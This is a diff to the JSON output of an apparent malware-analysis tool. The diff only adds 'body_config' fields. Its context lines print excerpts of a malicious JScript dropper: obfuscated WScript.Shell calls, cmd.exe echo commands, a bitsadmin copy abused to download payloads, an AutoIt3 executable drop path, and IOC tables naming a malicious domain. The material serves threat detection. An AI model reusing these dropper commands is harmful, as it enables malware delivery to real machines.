@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: Scripting.FileSystemObject\n\n\t\tNew ActiveXObject: WScript.Shell\n\n\t\tActiveXObject(Scripting.FileSystemObject)\n\n\t\tActiveXObject(WScript.Shell)\n\n\t\t \tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\t\tvar hYlWXjdjaPpgNpHbQTA = new ActiveXObject(\\\"WScript.Shell\\\")\n\t\t\t\t\t\t\t\t var RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\"Scripting.FileSystemObject\")\n\t\t\tvar hYlWXjdjaPpgNpHbQTA = new ActiveXObject(\"WScript.Shell\")\n\t\t\t\t var RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\"Scripting.FileSystemObject\")",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -39,6 +41,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]()\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -61,6 +64,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject to gain access to the computer's file system\n\t\tNew ActiveXObject: Scripting.FileSystemObject\n\n\t\tActiveXObject(Scripting.FileSystemObject)\n\n\t\tWScript.CreateObject(\"Scripting.FileSystemObject\")\n\n\t\tnew Scripting.FileSystemObject[14]()\n\n\t\tScripting.FileSystemObject[14].FileExists(\"C:\\Users\\Public\\po\")\n\n\t\tnew Scripting.FileSystemObject[16]()\n\n\t\tScripting.FileSystemObject[16].CreateFolder(\"C:\\W63770416524\\\")\n\n\t\tScripting.FileSystemObject[14].FileExists(\"C:\\W63770416524\\Nokia.Tivit.2022.2671.560.AutoIt3.exe\")\n\n\t\t \tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\t\t\t\t\t\t\t var RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\\\"Scripting.FileSystemObject\\\")\n\t\t\tvar eePQYAweHJLwigWOeChvc = new ActiveXObject(\"Scripting.FileSystemObject\")\n\t\t\t\t var RIOInbGPaTECWiezoRewQpEN = new ActiveXObject(\"Scripting.FileSystemObject\")",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -83,6 +87,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs Command Prompt via cmd.exe\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit\", 0, true)\n\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& ...\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& e...\n\t\t\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"echo '+wwhZyIIaxBpcxahb+'>'+IQKOrqKcLieoUcoiAOeHV+qkrEJUKOIcL...\n\t\t } catch (QBkhZXClpWYWxilyQkXzUE) { } \t\t\t\t\t\t\t\t\t\ttry {\t\t\t\t hYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"echo ...\n\t\t \t\t\t } catch (GAcjWCRAUHrRzUrAxKTrny) {\t\t\t\t\t\t}\t\t\t\t\ttry {\t\t\t\t hYlWXjdjaPpgNpHbQTA.run('cmd /V /C \\\"ec...\n\t\t\t\thYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo '+wwhZyIIaxBpcxahb+'>'+IQKOrqKcLieoUcoiAOeHV+qkrEJUKOIcLc...\n\t\t\t\t\t hYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>'+wwhZyIIaxBpcxahb+'\\...\n\t\t\t\t\t hYlWXjdjaPpgNpHbQTA.run('cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>'+wwhZyIIaxBpcxahb+'\\...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -105,6 +110,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs dropped executable\n\t\tWScript.Shell[15].run(\"colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe\", 0, true)\n\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset\", 0, true)\n\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -127,6 +133,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo C:\\W63770416524\\>C:\\Users\\Public\\po\"&& exit\", 0, true)\n\n\t\tWScript.Shell[15].run(\"colorcpl.exe C:\\\\Windows\\\\System32\\\\bitsadmin.exe\", 0, true)\n\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\bitsadmin.exe /reset\", 0, true)\n\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\bitsadmin.exe /transfer 4145022...\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r1.log\"&& ...\n\t\tWScript.Shell[15].run(\"cmd /V /C \"echo Nokia.Tivit.2022.2671.560.AutoIt3>C:\\W63770416524\\\\r.log\"&& e...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -149,6 +156,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"lwaiyh.cloudthradchen.fun\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?57261752224628739\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?57261752224628739\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?55863631366632969\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?55863631366632969\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?50209571596639078\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?50209571596639078\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?48963051144664142\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?48963051144664142\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?48710006293678025\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?48710006293678025\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?39711079126693642\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?39711079126693642\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?37437974563613970\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?37437974563613970\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -193,6 +206,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"lwaiyh.cloudthradchen.fun\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?57261752224628739\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?57261752224628739\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?55863631366632969\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?55863631366632969\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?50209571596639078\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?50209571596639078\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?48963051144664142\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?48963051144664142\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?48710006293678025\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?48710006293678025\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?39711079126693642\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?39711079126693642\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://lwaiyh.cloudthradchen.fun/?37437974563613970\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/?37437974563613970\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
